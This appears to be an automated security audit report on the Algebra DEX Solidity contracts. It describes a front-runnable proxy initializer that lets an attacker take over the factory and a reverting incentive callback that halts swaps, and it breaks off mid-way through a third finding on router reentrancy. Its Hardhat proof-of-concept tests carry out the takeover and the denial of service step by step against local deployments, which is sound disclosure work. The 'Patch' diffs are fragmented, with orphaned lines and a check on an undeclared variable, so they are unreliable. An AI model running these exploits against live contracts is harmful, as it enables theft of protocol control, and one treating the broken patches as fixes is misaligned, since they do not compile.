# Atomically initialize the core factory proxy
**#214847**
- Severity: Critical
- Validity: Unreviewed
## Source locations
### `src/core/contracts/AlgebraFactoryUpgradeable.sol` (5 locations)
#### Lines 69-90 — _The implementation disables its own initializer, but proxy storage remains externally initializable; initialize grants ownership/creator authority to the first caller and accepts an arbitrary nonzero deployer._ — _The initializer checks only a nonzero deployer and grants ownership-derived authority to msg.sender._ — _The unauthenticated initializer assigns the caller-derived ownership/role state and accepts any nonzero pool deployer._ — _Unauthenticated initializer sets factory configuration and grants the creation role to its caller._

```
  /**
   * @dev Initializes the contract by disabling the initializer of the inherited upgradeable contract.
   */
  constructor() {
    _disableInitializers();
  }

  function initialize(address _poolDeployer) external initializer {
    require(_poolDeployer != address(0));

    __AccessControlEnumerable_init();
    __Ownable2Step_init();

    poolDeployer = _poolDeployer;
    defaultTickspacing = Constants.INIT_DEFAULT_TICK_SPACING;
    defaultFee = Constants.INIT_DEFAULT_FEE;

    _grantRole(POOLS_CREATOR_ROLE, msg.sender);

    emit DefaultTickspacing(Constants.INIT_DEFAULT_TICK_SPACING);
    emit DefaultFee(Constants.INIT_DEFAULT_FEE);
  }
```
⋯
#### Lines 92-108 — _A factory owner can replace the pool deployer and is accepted in every role check._ — _Pool-deployer replacement is also based on owner authority and only checks nonzero._ — _Factory ownership is treated as equivalent to any queried role by `hasRoleOrOwner`._ — _Factory ownership is treated as equivalent to any queried role._ — _Factory ownership is accepted as equivalent to any queried role._ — _The owner is treated as a pool administrator by hasRoleOrOwner._

```
function setPoolDeployer(address newPoolDeployer) external reinitializer(2) onlyOwner {
  require(newPoolDeployer != address(0));
  poolDeployer = newPoolDeployer;
  emit PoolDeployer(newPoolDeployer);
}

function hasRoleOrOwner(bytes32 role, address account) public view override returns (bool) {
  return (owner() == account || super.hasRole(role, account));
}
```
⋯
#### Lines 133-155 — _Factory provisioning consumes the initialized authority and configuration._

```
  function createPool(address tokenA, address tokenB) external override returns (address pool) {
    if (!isPublicPoolCreationMode) {
      _checkRole(POOLS_CREATOR_ROLE);
    }
    require(tokenA != tokenB);
    (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
    require(token0 != address(0));
    require(poolByPair[token0][token1] == address(0));

    address defaultPlugin;
    if (address(defaultPluginFactory) != address(0)) {
      defaultPlugin = defaultPluginFactory.createPlugin(computePoolAddress(token0, token1), token0, token1);
    }
    pool = IAlgebraPoolDeployer(poolDeployer).deploy(defaultPlugin, token0, token1, address(0));

    poolByPair[token0][token1] = pool; // to avoid future addresses comparison we are populating the mapping twice
    poolByPair[token1][token0] = pool;
    emit Pool(token0, token1, pool);

    if (address(vaultFactory) != address(0)) {
      vaultFactory.createVaultForPool(pool);
    }
  }
```
⋯
#### Lines 195-239 — _Factory-wide pool-creation and default plugin/vault configuration are owner-controlled._

```
  /// @inheritdoc IAlgebraFactory
  function setIsPublicPoolCreationMode(bool mode_) external override onlyOwner {
    isPublicPoolCreationMode = mode_;
    emit PublicPoolCreationMode(mode_);
  }

  /// @inheritdoc IAlgebraFactory
  function setDefaultCommunityFee(uint16 newDefaultCommunityFee) external override onlyOwner {
    require(newDefaultCommunityFee <= Constants.MAX_COMMUNITY_FEE);
    require(defaultCommunityFee != newDefaultCommunityFee);
    if (newDefaultCommunityFee != 0) require(address(vaultFactory) != address(0));
    defaultCommunityFee = newDefaultCommunityFee;
    emit DefaultCommunityFee(newDefaultCommunityFee);
  }

  /// @inheritdoc IAlgebraFactory
  function setDefaultFee(uint16 newDefaultFee) external override onlyOwner {
    require(newDefaultFee <= Constants.MAX_DEFAULT_FEE);
    require(defaultFee != newDefaultFee);
    defaultFee = newDefaultFee;
    emit DefaultFee(newDefaultFee);
  }

  /// @inheritdoc IAlgebraFactory
  function setDefaultTickspacing(int24 newDefaultTickspacing) external override onlyOwner {
    require(newDefaultTickspacing >= Constants.MIN_TICK_SPACING);
    require(newDefaultTickspacing <= Constants.MAX_TICK_SPACING);
    require(newDefaultTickspacing != defaultTickspacing);
    defaultTickspacing = newDefaultTickspacing;
    emit DefaultTickspacing(newDefaultTickspacing);
  }

  /// @inheritdoc IAlgebraFactory
  function setDefaultPluginFactory(address newDefaultPluginFactory) external override onlyOwner {
    require(newDefaultPluginFactory != address(defaultPluginFactory));
    defaultPluginFactory = IAlgebraPluginFactory(newDefaultPluginFactory);
    emit DefaultPluginFactory(newDefaultPluginFactory);
  }

  /// @inheritdoc IAlgebraFactory
  function setVaultFactory(address newVaultFactory) external override onlyOwner {
    require(newVaultFactory != address(vaultFactory));
    if (newVaultFactory == address(0)) require(defaultCommunityFee == 0);
    vaultFactory = IAlgebraVaultFactory(newVaultFactory);
    emit VaultFactory(newVaultFactory);
```

### `src/core/contracts/AlgebraPool.sol`
#### Lines 387-447 — _Existing pool administration accepts factory owner authority and controls plugin, fee, tick-spacing, and vault state._ — _Pool administration uses the factory owner-or-role check for live community-fee configuration._ — _The resulting pool-admin authority can replace plugin and community-vault configuration._ — _The same authorization controls the pending-fee destination._

```
  /// @dev using function to save bytecode
  function _checkIfAdministrator() private view {
    if (!IAlgebraFactory(factory).hasRoleOrOwner(Constants.POOLS_ADMINISTRATOR_ROLE, msg.sender)) revert notAllowed();
  }

  // permissioned actions use reentrancy lock to prevent call from callback (to keep the correct order of events, etc.)

  /// @inheritdoc IAlgebraPoolPermissionedActions
  function setCommunityFee(uint16 newCommunityFee) external override onlyUnlocked {
    _checkIfAdministrator();
    if (
      newCommunityFee > Constants.MAX_COMMUNITY_FEE ||
      newCommunityFee == globalState.communityFee ||
      (newCommunityFee != 0 && communityVault == address(0))
    ) revert invalidNewCommunityFee();
    _setCommunityFee(newCommunityFee);
  }

  /// @inheritdoc IAlgebraPoolPermissionedActions
  function setTickSpacing(int24 newTickSpacing) external override onlyUnlocked {
    _checkIfAdministrator();
    if (newTickSpacing <= 0 || newTickSpacing > Constants.MAX_TICK_SPACING || tickSpacing == newTickSpacing) revert invalidNewTickSpacing();
    _setTickSpacing(newTickSpacing);
  }

  /// @inheritdoc IAlgebraPoolPermissionedActions
  function setPlugin(address newPluginAddress) external override onlyUnlocked {
    _checkIfAdministrator();
    _setPluginConfig(0);
    _setPlugin(newPluginAddress);
  }

  /// @inheritdoc IAlgebraPoolPermissionedActions
  function setPluginConfig(uint8 newConfig) external override onlyUnlocked {
    address _plugin = plugin;
    if (_plugin == address(0)) revert pluginIsNotConnected(); // it is not allowed to set plugin config without plugin

    if (msg.sender != _plugin) _checkIfAdministrator();

    _setPluginConfig(newConfig);
  }

  /// @inheritdoc IAlgebraPoolPermissionedActions
  function setCommunityVault(address newCommunityVault) external override onlyUnlocked {
    _checkIfAdministrator();
    if (newCommunityVault == address(0) && globalState.communityFee != 0) _setCommunityFee(0); // the pool should not accumulate a community fee without a vault
    _setCommunityFeeVault(newCommunityVault); // accumulated but not yet sent to the vault community fees once will be sent to the `newCommunityVault` address
  }

  /// @inheritdoc IAlgebraPoolPermissionedActions
  function setFee(uint16 newFee) external override {
    bool isDynamicFeeEnabled = globalState.pluginConfig.hasFlag(Plugins.DYNAMIC_FEE);
    if (!globalState.unlocked) revert IAlgebraPoolErrors.locked(); // cheaper to check lock here

    if (msg.sender == plugin) {
      if (!isDynamicFeeEnabled) revert dynamicFeeDisabled();
    } else {
      if (isDynamicFeeEnabled) revert dynamicFeeActive();
      _checkIfAdministrator();
    }
    _setFee(newFee);
```

```
    await entryPoint.setCustomPoolDeployer(await customFactory.getAddress(), true);
```
### `src/core/contracts/AlgebraCommunityVault.sol`
#### Lines 38-40 — _Vault administrator authorization delegates to the factory's owner-equivalent role check._

```
  modifier onlyAdministrator() {
    require(IAlgebraFactory(factory).hasRoleOrOwner(COMMUNITY_FEE_VAULT_ADMINISTRATOR, msg.sender), 'only administrator');
    _;
```
## Description

The factory deployment script creates a `TransparentUpgradeableProxy` with `0x` initialization data and invokes `initialize` in a later transaction. During that interval, any account can call `initialize` with a nonzero `_poolDeployer`; the call initializes ownership, grants `POOLS_CREATOR_ROLE` to `msg.sender`, and consumes the one-time initializer. Factory ownership is also treated as satisfying arbitrary role checks and is synchronized with `DEFAULT_ADMIN_ROLE`, extending the takeover beyond pool creation. The seized owner can alter factory defaults and dependencies, replace the pool deployer through `setPoolDeployer`, and pass pool and community-vault administrative authorization. Deploy the proxy with encoded initializer calldata (or otherwise bind initialization to a predetermined authorized initializer) so no externally reachable uninitialized proxy exists.
## Root cause

`AlgebraFactoryUpgradeable.initialize` derives privileged state from an unauthenticated first caller while the deployment script exposes the proxy before initialization.
## Impact

A mempool attacker can claim factory control before intended setup completes and prevent the intended initializer from succeeding. They can change pool fee, plugin, tick-spacing, vault, and deployment configuration, and can exercise owner-equivalent administration over existing pools and the community-vault authorization boundary. A malicious configured deployer can also control the parameters consumed when subsequent pools are constructed.
## Proof of concept
### Test case

```
import { ethers } from 'hardhat';
import { getCreateAddress, ZeroAddress } from 'ethers';

import { expect } from './shared/expect';
import { encodePriceSqrt } from './shared/utilities';
import { AlgebraFactoryUpgradeable, AlgebraPool } from '../typechain';

describe('PoC: uninitialized AlgebraFactory proxy can be seized', () => {
  it('lets the first external caller initialize the proxy, become owner/admin, and block the intended initializer', async () => {
    const [deployer, attacker, intendedOwner] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('AlgebraFactoryUpgradeable');
    const implementation = await Factory.deploy();

    const proxyAdmin = await ethers.deployContract('ProxyAdmin');

    // This is the same vulnerable deployment shape as src/core/scripts/deploy.js:
    // the proxy is published with empty initializer calldata, so its own storage is still uninitialized.
    const Proxy = await ethers.getContractFactory('TransparentUpgradeableProxy');
    const proxy = await Proxy.deploy(implementation.target, proxyAdmin.target, '0x');
    const factory = Factory.attach(proxy.target) as any as AlgebraFactoryUpgradeable;

    // The intended deployer plans to initialize the proxy with the address of the real pool deployer
    // that will be deployed later by the same account. This value is not yet bound to the proxy.
    const intendedPoolDeployerAddress = getCreateAddress({
      from: deployer.address,
      nonce: (await ethers.provider.getTransactionCount(deployer.address)) + 1,
    });

    // During the public uninitialized window, an arbitrary account front-runs initialize().
    // The only deployer validation is nonzero, so the attacker can temporarily use an EOA.
    await factory.connect(attacker).initialize(attacker.address);

    const poolsCreatorRole = await factory.POOLS_CREATOR_ROLE();
    const poolsAdministratorRole = await factory.POOLS_ADMINISTRATOR_ROLE();
    const defaultAdminRole = await factory.DEFAULT_ADMIN_ROLE();

    expect(await factory.owner()).to.eq(attacker.address);
    expect(await factory.poolDeployer()).to.eq(attacker.address);
    expect(await factory.hasRole(poolsCreatorRole, attacker.address)).to.eq(true);
    expect(await factory.hasRole(defaultAdminRole, attacker.address)).to.eq(true);
    expect(await factory.hasRoleOrOwner(poolsAdministratorRole, attacker.address)).to.eq(true);

    // The legitimate initializer is now permanently blocked by Initializable's one-shot guard.
    await expect(factory.connect(intendedOwner).initialize(intendedPoolDeployerAddress)).to.be.revertedWith(
      'Initializable: contract is already initialized'
    );
    expect(await factory.owner()).to.eq(attacker.address);

    // Owner-only global configuration is controlled by the attacker and rejected for the intended owner.
    await expect(factory.connect(intendedOwner).setDefaultFee(777)).to.be.revertedWith('Ownable: caller is not the owner');
    await factory.connect(attacker).setDefaultFee(777);
    expect(await factory.defaultFee()).to.eq(777);

    // The seized owner can consume the reinitializer(2) migration path to replace the pool deployer.
    const PoolDeployer = await ethers.getContractFactory('AlgebraPoolDeployer');
    const realPoolDeployer = await PoolDeployer.deploy(factory);
    await factory.connect(attacker).setPoolDeployer(realPoolDeployer.target);
    expect(await factory.poolDeployer()).to.eq(realPoolDeployer.target);

    // Attacker's POOLS_CREATOR_ROLE is live: with public creation disabled, a non-creator cannot create,
    // but the attacker can create a real AlgebraPool through the production factory/deployer path.
    const Token = await ethers.getContractFactory('TestERC20');
    const tokenA = await Token.deploy(2n ** 128n);
    const tokenB = await Token.deploy(2n ** 128n);
    await expect(factory.connect(intendedOwner).createPool(tokenA.target, tokenB.target)).to.be.reverted;
    await factory.connect(attacker).createPool(tokenA.target, tokenB.target);

    const poolAddress = await factory.poolByPair(tokenA.target, tokenB.target);
    expect(poolAddress).to.not.eq(ZeroAddress);
    const pool = (await ethers.getContractAt('AlgebraPool', poolAddress)) as any as AlgebraPool;

    // Pool initialization reads the attacker-modified factory defaults.
    await pool.initialize(encodePriceSqrt(1, 1));
    const stateAfterInitialize = await pool.globalState();
    expect(stateAfterInitialize.lastFee).to.eq(777);

    // The attacker also satisfies AlgebraPool's factory owner-or-role administrator check.
    await expect(pool.connect(intendedOwner).setTickSpacing(100)).to.be.reverted;
    await pool.connect(attacker).setTickSpacing(100);
    expect(await pool.tickSpacing()).to.eq(100);
  });
});
```

### Considerations

PoC executed successfully in `unit:cryptoalgebra-integral-core` via `npx hardhat test test/Poc.spec.ts` after `npm run compile`. It proves the core `AlgebraFactoryUpgradeable` empty-proxy initialization race end-to-end: external attacker initializes the real proxy, becomes owner/DEFAULT_ADMIN/creator, blocks later legitimate initialization, changes owner-only defaults, consumes `setPoolDeployer`, creates a real pool through the production deployer path, and uses owner-equivalent pool administrator authority. The PoC does not separately exercise the analogous `CustomPoolPluginFactory.initialize` variant; that remains a same-pattern extension rather than a step needed for the demonstrated core factory takeover.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

The factory implementation immutably records its authorized initializer at implementation deployment and rejects proxy initialization from any other caller. This closes the takeover window even for existing empty-calldata deployment flows without changing initialized factory behavior.
### Patch

```diff
diff --git a/src/core/contracts/AlgebraFactoryUpgradeable.sol b/src/core/contracts/AlgebraFactoryUpgradeable.sol
--- a/src/core/contracts/AlgebraFactoryUpgradeable.sol
+++ b/src/core/contracts/AlgebraFactoryUpgradeable.sol

+  /// @dev address authorized to initialize proxies using this implementation

+    require(msg.sender == authorizedInitializer);

   /// @notice Updates the pool deployer after upgrading an existing factory proxy.

   /// @inheritdoc IAlgebraFactory

   /// @inheritdoc IAlgebraFactory

   }

   function createPool(address tokenA, address tokenB) external override returns (address pool) {
     if (!isPublicPoolCreationMode) {
       _checkRole(POOLS_CREATOR_ROLE);
     }
     require(tokenA != tokenB);
     (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
     require(token0 != address(0));
     require(poolByPair[token0][token1] == address(0));
 
     address defaultPlugin;

     }
     pool = IAlgebraPoolDeployer(poolDeployer).deploy(defaultPlugin, token0, token1, address(0));
 
     poolByPair[token0][token1] = pool; // to avoid future addresses comparison we are populating the mapping twice
     poolByPair[token1][token0] = pool;

       customDeployer,

       token1,

     IAlgebraPluginFactory(msg.sender).afterCreatePoolHook(plugin, customPool, customDeployer);
 
     customPoolByPair[customDeployer][token0][token1] = customPool;
     customPoolByPair[customDeployer][token1][token0] = customPool;
     deployerByPool[customPool] = customDeployer;
     emit CustomPool(customDeployer, token0, token1, customPool);

     require(newDefaultTickspacing != defaultTickspacing);

     emit VaultFactory(newVaultFactory);

     require(renounceOwnershipStartTimestamp == 0);
     renounceOwnershipStartTimestamp = block.timestamp;
     emit RenounceOwnershipStart(renounceOwnershipStartTimestamp, renounceOwnershipStartTimestamp + RENOUNCE_OWNERSHIP_DELAY);
   }
 
   /// @inheritdoc IAlgebraFactory
   function stopRenounceOwnership() external override onlyOwner {
     require(renounceOwnershipStartTimestamp != 0);
     renounceOwnershipStartTimestamp = 0;
     emit RenounceOwnershipStop(block.timestamp);
```

# Incentive Callback Can Halt Swaps
**#214044**
- Severity: High
- Validity: Unreviewed
## Source locations
### `src/plugin/contracts/AlgebraBasePluginV1.sol` (2 locations)
#### Lines 188-208 — _The farming address may set any nonzero incentive and no target-code or implementation check is performed._

```
  function setIncentive(address newIncentive) external override {
    bool toConnect = newIncentive != address(0);
    bool accessAllowed;
    if (toConnect) {
      accessAllowed = msg.sender == IBasePluginV1Factory(pluginFactory).farmingAddress();
```

⋯
#### Lines 267-271 — _afterSwap synchronously calls the external incentive and ignores no failure path._

```

```
### `src/core/contracts/AlgebraPool.sol` (2 locations)
#### Lines 248-250 — _The pool unlocks before invoking afterSwap, but the hook remains in the outer swap transaction._

```
    _unlock();
    _afterSwap(recipient, zeroToOne, amountRequired, limitSqrtPrice, amount0, amount1, data);
  }
```
⋯
#### Lines 327-331 — _The pool invokes the hook and requires the returned selector, propagating callback failure._

```
  function _afterSwap(address recipient, bool zto, int256 amount, uint160 limitPrice, int256 amount0, int256 amount1, bytes calldata data) internal {
    if (globalState.pluginConfig.hasFlag(Plugins.AFTER_SWAP_FLAG)) {
      IAlgebraPlugin(plugin).afterSwap(msg.sender, recipient, zto, amount, limitPrice, amount0, amount1, data).shouldReturn(
        IAlgebraPlugin.afterSwap.selector
      );
```
## Description

`afterSwap` forwards execution to the configured incentive with no code, interface, gas, or failure-isolation check. The only gate in `setIncentive` is that the caller is the configured farming address; any nonzero address can therefore become the callback target. The pool invokes this hook after its swap lock has already been released, but the external call remains part of the same transaction, so any revert from `crossTo` bubbles through `shouldReturn` and reverts the completed swap. A callback that loops or otherwise consumes the forwarded gas has the same effect once the transaction runs out of gas.
## Root cause

The plugin treats an externally selected `incentive` as a mandatory synchronous callback and forwards all failure and gas behavior to the pool transaction. `setIncentive` does not restrict the target to a code-bearing, trusted virtual-pool implementation or isolate callback failure.
## Impact

A farming-authority misconfiguration or compromised incentive contract can make every swap on the affected pool revert or exceed the gas limit until the incentive is disconnected. This blocks trading and can strand users who need a successful swap to rebalance or exit, although it does not directly transfer pool funds.
## Proof of concept
### Test case

```
      swapTarget: fix.swapTargetCallee,
      token0: fix.token0,
      token1: fix.token1,
      pool: pool as unknown as MockTimeAlgebraPool,
    });

    await mint(deployer.address, minTick, maxTick, expandTo18Decimals(2));

    await fix.token0.transfer(trader.address, expandTo18Decimals(10));
    await fix.token1.transfer(trader.address, expandTo18Decimals(10));
    await fix.token0.connect(trader).approve(fix.swapTargetCallee, MaxUint256);
    await fix.token1.connect(trader).approve(fix.swapTargetCallee, MaxUint256);

    await mockPluginFactory.setFarmingAddress(farming.address);
    const revertingIncentive = await (await ethers.getContractFactory('RevertingVirtualPool')).deploy();

    return { fix, pool, plugin, mockPluginFactory, trader, farming, revertingIncentive };
  }

  it('bubbles a reverting incentive crossTo through the real pool swap path', async () => {
    const { fix, pool, plugin, trader, farming, revertingIncentive } = await loadFixture(vulnerablePoolFixture);

    const limitPrice = MIN_SQRT_RATIO + 1n;

    const traderToken1BeforeWorkingSwap = await fix.token1.balanceOf(trader.address);
    await expect(fix.swapTargetCallee.connect(trader).swapExact0For1(pool, 10_000n, trader.address, limitPrice)).to.not.be.reverted;
    const traderToken1AfterWorkingSwap = await fix.token1.balanceOf(trader.address);
    expect(traderToken1AfterWorkingSwap).to.be.gt(traderToken1BeforeWorkingSwap);

    const defaultConfig = await plugin.defaultPluginConfig();
    expect((await pool.globalState()).pluginConfig).to.eq(defaultConfig);

    await plugin.connect(farming).setIncentive(revertingIncentive);
    expect(await plugin.incentive()).to.eq(await revertingIncentive.getAddress());
    expect((await pool.globalState()).pluginConfig).to.eq(defaultConfig | 2n);

    const stateBeforeHaltedSwap = await pool.globalState();
    const traderToken1BeforeHaltedSwap = await fix.token1.balanceOf(trader.address);

    await expect(fix.swapTargetCallee.connect(trader).swapExact0For1(pool, 10_000n, trader.address, limitPrice)).to.be.revertedWith('INCENTIVE_HALT');

    const stateAfterHaltedSwap = await pool.globalState();
    const traderToken1AfterHaltedSwap = await fix.token1.balanceOf(trader.address);
    expect(stateAfterHaltedSwap.price).to.eq(stateBeforeHaltedSwap.price);
    expect(stateAfterHaltedSwap.tick).to.eq(stateBeforeHaltedSwap.tick);
    expect(traderToken1AfterHaltedSwap).to.eq(traderToken1BeforeHaltedSwap);
  });
});
```

### Considerations

PoC used the plugin member Hardhat harness with MockTimeAlgebraPool and MockTimeAlgebraBasePluginV1 test wrappers to control time; both execute the real AlgebraPool and AlgebraBasePluginV1 inherited vulnerable swap/hook code. The malicious incentive demonstrates the revert path, not the gas-exhaustion variant.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Isolate the optional incentive callback with Solidity try/catch so a reverting, malformed, code-less, or gas-consuming virtual pool cannot propagate failure through the plugin and revert an otherwise valid pool swap; successful callbacks retain unchanged behavior.
### Patch

```diff
diff --git a/src/plugin/contracts/AlgebraBasePluginV1.sol b/src/plugin/contracts/AlgebraBasePluginV1.sol
--- a/src/plugin/contracts/AlgebraBasePluginV1.sol
+++ b/src/plugin/contracts/AlgebraBasePluginV1.sol

 /// @notice This contract stores timepoints and calculates adaptive fee and statistical averages
 contract AlgebraBasePluginV1 is IAlgebraBasePluginV1, IAlgebraPlugin, Initializable, TimestampUpgradeable {
   using Plugins for uint8;
   using AlgebraFeeConfigurationU144Lib for AlgebraFeeConfiguration;
 
   uint256 internal constant UINT16_MODULO = 65536;
   using VolatilityOracle for VolatilityOracle.Timepoint[UINT16_MODULO];
 
   /// @dev The role can be granted in AlgebraFactory
   bytes32 public constant ALGEBRA_BASE_PLUGIN_MANAGER = keccak256('ALGEBRA_BASE_PLUGIN_MANAGER');

     external
     view
     override
     returns (uint16 alpha1, uint16 alpha2, uint32 beta1, uint32 beta2, uint16 gamma1, uint16 gamma2, uint16 baseFee)
   {
     (alpha1, alpha2) = (_feeConfig.alpha1(), _feeConfig.alpha2());
     (beta1, beta2) = (_feeConfig.beta1(), _feeConfig.beta2());
     (gamma1, gamma2) = (_feeConfig.gamma1(), _feeConfig.gamma2());
     baseFee = _feeConfig.baseFee();

   function _checkIfFromPool() internal view {
     require(msg.sender == pool, 'Only pool can call this');

   function _getPoolState() internal view returns (uint160 price, int24 tick, uint16 fee, uint8 pluginConfig) {
     (price, tick, fee, pluginConfig, , ) = IAlgebraPoolState(pool).globalState();
   }
 
   function _getPluginInPool() internal view returns (address plugin) {
     return IAlgebraPool(pool).plugin();
   }
 
   /// @inheritdoc IAlgebraBasePluginV1
   function initialize() external override {
     require(!isInitialized, 'Already initialized');
     require(_getPluginInPool() == address(this), 'Plugin not attached');
     (uint160 price, int24 tick, , ) = _getPoolState();
     require(price != 0, 'Pool is not initialized');
 
     uint32 time = _blockTimestamp();
     timepoints.initialize(time, tick);
     lastTimepointTimestamp = time;
     isInitialized = true;
 
     _updatePluginConfigInPool();
   }
 
   // ###### Volatility and TWAP oracle ######
 
   /// @inheritdoc IVolatilityOracle
   function getSingleTimepoint(uint32 secondsAgo) external view override returns (int56 tickCumulative, uint88 volatilityCumulative) {
     // `volatilityCumulative` values for timestamps after the last timepoint _should not_ be compared: they may differ due to interpolation errors
     (, int24 tick, , ) = _getPoolState();
     uint16 lastTimepointIndex = timepointIndex;
     uint16 oldestIndex = timepoints.getOldestIndex(lastTimepointIndex);
     VolatilityOracle.Timepoint memory result = timepoints.getSingleTimepoint(_blockTimestamp(), secondsAgo, tick, lastTimepointIndex, oldestIndex);
     (tickCumulative, volatilityCumulative) = (result.tickCumulative, result.volatilityCumulative);
   }
 
   /// @inheritdoc IVolatilityOracle
   function getTimepoints(
     uint32[] memory secondsAgos
   ) external view override returns (int56[] memory tickCumulatives, uint88[] memory volatilityCumulatives) {
     // `volatilityCumulative` values for timestamps after the last timepoint _should not_ be compared: they may differ due to interpolation errors
     (, int24 tick, , ) = _getPoolState();
     return timepoints.getTimepoints(_blockTimestamp(), secondsAgos, tick, timepointIndex);
   }
 
   /// @inheritdoc IVolatilityOracle
   function prepayTimepointsStorageSlots(uint16 startIndex, uint16 amount) external override {
     require(!timepoints[startIndex].initialized); // if not initialized, then all subsequent ones too
     require(amount > 0 && type(uint16).max - startIndex >= amount);
 
     unchecked {
       for (uint256 i = startIndex; i < startIndex + amount; ++i) {
         timepoints[i].blockTimestamp = 1; // will be overwritten
       }
     }

   // ###### Fee manager ######
 
   /// @inheritdoc IDynamicFeeManager
   function changeFeeConfiguration(AlgebraFeeConfiguration calldata _config) external override {
     require(msg.sender == pluginFactory || IAlgebraFactory(factory).hasRoleOrOwner(ALGEBRA_BASE_PLUGIN_MANAGER, msg.sender));
     AdaptiveFee.validateFeeConfiguration(_config);
 
     _feeConfig = _config.pack(); // pack struct to uint144 and write in storage
     emit FeeConfiguration(_config);
   }
 
   /// @inheritdoc IAlgebraDynamicFeePlugin
   function getCurrentFee() external view override returns (uint16 fee) {
     uint16 lastIndex = timepointIndex;
     AlgebraFeeConfigurationU144 feeConfig_ = _feeConfig;
     if (feeConfig_.alpha1() | feeConfig_.alpha2() == 0) return feeConfig_.baseFee();
 
     uint16 oldestIndex = timepoints.getOldestIndex(lastIndex);
     (, int24 tick, , ) = _getPoolState();
 
     uint88 volatilityAverage = timepoints.getAverageVolatility(_blockTimestamp(), tick, lastIndex, oldestIndex);
     return AdaptiveFee.getFee(volatilityAverage, feeConfig_);
   }
 
   function _getFeeAtLastTimepoint(

     int24 currentTick,

   ) internal view returns (uint16 fee) {
     if (feeConfig_.alpha1() | feeConfig_.alpha2() == 0) return feeConfig_.baseFee();
 
     uint88 volatilityAverage = timepoints.getAverageVolatility(_blockTimestamp(), currentTick, lastTimepointIndex, oldestTimepointIndex);
     return AdaptiveFee.getFee(volatilityAverage, feeConfig_);

   // ###### Farming plugin ######
 
   /// @inheritdoc IFarmingPlugin
   function setIncentive(address newIncentive) external override {

     bool accessAllowed;
     if (toConnect) {
       accessAllowed = msg.sender == IBasePluginV1Factory(pluginFactory).farmingAddress();
     } else {
       // we allow the one who connected the incentive to disconnect it,
       // even if he no longer has the rights to connect incentives
       if (_lastIncentiveOwner != address(0)) accessAllowed = msg.sender == _lastIncentiveOwner;
       if (!accessAllowed) accessAllowed = msg.sender == IBasePluginV1Factory(pluginFactory).farmingAddress();
     }
     require(accessAllowed, 'Not allowed to set incentive');
 
     bool isPluginConnected = _getPluginInPool() == address(this);
     if (toConnect) require(isPluginConnected, 'Plugin not attached');
 
     address currentIncentive = incentive;
     require(currentIncentive != newIncentive, 'Already active');
     if (toConnect) require(currentIncentive == address(0), 'Has active incentive');
 
     incentive = newIncentive;
     emit Incentive(newIncentive);
 
     if (toConnect) {
       _lastIncentiveOwner = msg.sender; // write creator of this incentive
     } else {

     if (!pluginConfig.hasFlag(Plugins.AFTER_SWAP_FLAG)) return false;

   /// @dev unused

   }
 
   /// @dev unused
   function afterModifyPosition(address, address, int24, int24, int128, uint256, uint256, bytes calldata) external override onlyPool returns (bytes4) {
     _updatePluginConfigInPool(); // should not be called, reset config
     return IAlgebraPlugin.afterModifyPosition.selector;
   }
 
   function beforeSwap(address, address, bool, int256, uint160, bool, bytes calldata) external override onlyPool returns (bytes4) {
     _writeTimepointAndUpdateFee();
     return IAlgebraPlugin.beforeSwap.selector;
   }
 
   function afterSwap(address, address, bool zeroToOne, int256, uint160, int256, int256, bytes calldata) external override onlyPool returns (bytes4) {
     address _incentive = incentive;
     if (_incentive != address(0)) {
       (, int24 tick, , ) = _getPoolState();
-      IAlgebraVirtualPool(_incentive).crossTo(tick, zeroToOne);
+      try IAlgebraVirtualPool(_incentive).crossTo(tick, zeroToOne) {} catch {}
     } else {
       _updatePluginConfigInPool(); // should not be called, reset config
     }
 
     return IAlgebraPlugin.afterSwap.selector;
   }
 
   /// @dev unused
   function beforeFlash(address, address, uint256, uint256, bytes calldata) external override onlyPool returns (bytes4) {
     _updatePluginConfigInPool(); // should not be called, reset config
     return IAlgebraPlugin.beforeFlash.selector;
   }
 
   /// @dev unused
   function afterFlash(address, address, uint256, uint256, uint256, uint256, bytes calldata) external override onlyPool returns (bytes4) {
     _updatePluginConfigInPool(); // should not be called, reset config
     return IAlgebraPlugin.afterFlash.selector;
   }
 
   function _updatePluginConfigInPool() internal {
     uint8 newPluginConfig = defaultPluginConfig;
     if (incentive != address(0)) {
       newPluginConfig |= uint8(Plugins.AFTER_SWAP_FLAG);
     }
 
     (, , , uint8 currentPluginConfig) = _getPoolState();
     if (currentPluginConfig != newPluginConfig) {
       IAlgebraPool(pool).setPluginConfig(newPluginConfig);
     }
   }
 
   function _writeTimepointAndUpdateFee() internal {
     // single SLOAD
     uint16 _lastIndex = timepointIndex;
     uint32 _lastTimepointTimestamp = lastTimepointTimestamp;
     AlgebraFeeConfigurationU144 feeConfig_ = _feeConfig; // struct packed in uint144
     bool _isInitialized = isInitialized;
     require(_isInitialized, 'Not initialized');
 
     uint32 currentTimestamp = _blockTimestamp();
 
     if (_lastTimepointTimestamp == currentTimestamp) return;
 
     (, int24 tick, uint16 fee, ) = _getPoolState();
     (uint16 newLastIndex, uint16 newOldestIndex) = timepoints.write(_lastIndex, currentTimestamp, tick);
 
     timepointIndex = newLastIndex;
     lastTimepointTimestamp = currentTimestamp;
 
     uint16 newFee = _getFeeAtLastTimepoint(newLastIndex, newOldestIndex, tick, feeConfig_);
     if (newFee != fee) {
       IAlgebraPool(pool).setFee(newFee);
     }
   }

    * @dev This empty reserved space is put in place to allow future versions to add new
    * variables without shifting down storage in the inheritance chain.
    * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
    */
   uint256[50] private __gap;
```

# Reentrant token can drain router-custodied output
**#214095**
- Severity: High
- Validity: Unreviewed
## Source locations
### `src/periphery/contracts/SwapRouter.sol`
#### Lines 83-119 — _Zero-recipient swaps custody output in the router and validate only the returned minimum._

```
    function exactInputInternal(
        uint256 amountIn,
        address recipient,
        uint160 limitSqrtPrice,
        SwapCallbackData memory data
    ) private returns (uint256 amountOut) {
        if (recipient == address(0)) recipient = address(this); // allow swapping to the router address with address 0

        (address tokenIn, address deployer, address tokenOut) = data.path.decodeFirstPool();

        bool zeroToOne = tokenIn < tokenOut;

        (int256 amount0, int256 amount1) = getPool(deployer, tokenIn, tokenOut).swap(
            recipient,
            zeroToOne,
            amountIn.toInt256(),
            limitSqrtPrice == 0
